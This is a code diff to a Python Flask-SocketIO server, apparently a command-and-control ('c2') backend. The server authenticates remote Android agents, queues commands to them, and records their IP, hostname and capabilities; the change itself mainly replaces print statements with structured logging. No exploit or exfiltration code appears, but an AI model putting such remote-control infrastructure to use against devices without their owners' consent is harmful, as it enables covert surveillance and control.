@@ -19,6 +19,7 @@ import time
 from flask import request
 from flask_socketio import disconnect, emit, join_room
 
+from c2 import logs
 from c2.auth import agent_key_ok, key_fingerprint
 from c2.timeutil import utcnow
 from c2.ws_dashboard import broadcast, socketio
@@ -27,6 +28,8 @@ from database import db
 from models import Command, Device
 
 RESULT_MAX_CHARS = 512 * 1024
+
+_log = logs.get_logger("c2.agent")
 
 # device_id -> sid
 _agents: dict[str, str] = {}
@@ -69,31 +72,34 @@ def register_agent_ws():
                 #
                 # The fingerprint answers "wrong key" vs "no key" without
                 # putting either secret in the log.
-                print(f"[agent] rejected: device={device_id[:8]} "
-                      f"got_key={key_fingerprint(key)} "
-                      f"want_key={key_fingerprint(Config.API_KEY)}", flush=True)
+                logs.log(_log, "warn", "agent.rejected",
+                         device=device_id[:8],
+                         got_key=key_fingerprint(key),
+                         want_key=key_fingerprint(Config.API_KEY))
                 return False
 
             # No device_id in the handshake: this client authenticates later
             # via `hello`. Accept it, but do not let it linger forever if
             # `hello` never arrives.
-            print(f"[agent] anonymous connect, got_key="
-                  f"{key_fingerprint(key)} (awaiting hello)", flush=True)
+            logs.log(_log, "info", "agent.anonymous",
+                     got_key=key_fingerprint(key), awaiting="hello")
             _kick_if_unbound(60.0)
             return True
 
         _bind(device_id, a)
         emit("accept", {"device_id": device_id, "commands": _drain(device_id)})
-        print(f"[agent] accepted {device_id}", flush=True)
+        logs.log(_log, "info", "agent.accepted",
+                 device=device_id[:8], via="handshake",
+                 key=key_fingerprint(Config.API_KEY))
         return True
 
     @socketio.on("hello", namespace="/agent")
     def on_agent_hello(data):
         a = data if isinstance(data, dict) else {}
         if not agent_key_ok(a.get("api_key")):
-            print(f"[agent] hello rejected: "
-                  f"got_key={key_fingerprint(a.get('api_key'))} "
-                  f"want_key={key_fingerprint(Config.API_KEY)}", flush=True)
+            logs.log(_log, "warn", "agent.hello_rejected",
+                     got_key=key_fingerprint(a.get("api_key")),
+                     want_key=key_fingerprint(Config.API_KEY))
             emit("reject", {"error": "unauthorized"})
             disconnect()
             return
@@ -106,7 +112,9 @@ def register_agent_ws():
 
         _bind(device_id, a)
         emit("accept", {"device_id": device_id, "commands": _drain(device_id)})
-        print(f"[agent] accepted via hello {device_id}", flush=True)
+        logs.log(_log, "info", "agent.accepted",
+             device=device_id[:8], via="hello",
+             key=key_fingerprint(Config.API_KEY))
 
     @socketio.on("state", namespace="/agent")
     def on_agent_state(data):
@@ -201,7 +209,7 @@ def register_agent_ws():
                 dev.is_online = False
                 db.session.commit()
                 _emit_device(dev)
-            print(f"[agent] disconnected {device_id}", flush=True)
+            logs.log(_log, "info", "agent.disconnected", device=device_id[:8])
 
 
 def _kick_if_unbound(delay: float = 10.0) -> None:
@@ -250,6 +258,11 @@ def _bind(device_id: str, meta: dict) -> None:
             pass
     dev.hostname = meta.get("hostname") or dev.hostname
     dev.ip_address = request.remote_addr
+    dev.agent_version = meta.get("agent_version") or dev.agent_version
+    # Absent or null keeps whatever was learned before; an explicit list
+    # replaces it, so a rebuilt APK can drop commands it no longer has.
+    if meta.get("capabilities") is not None:
+        dev.set_capabilities(meta.get("capabilities"))
     dev.last_seen = utcnow()
     dev.is_online = True
     db.session.commit()
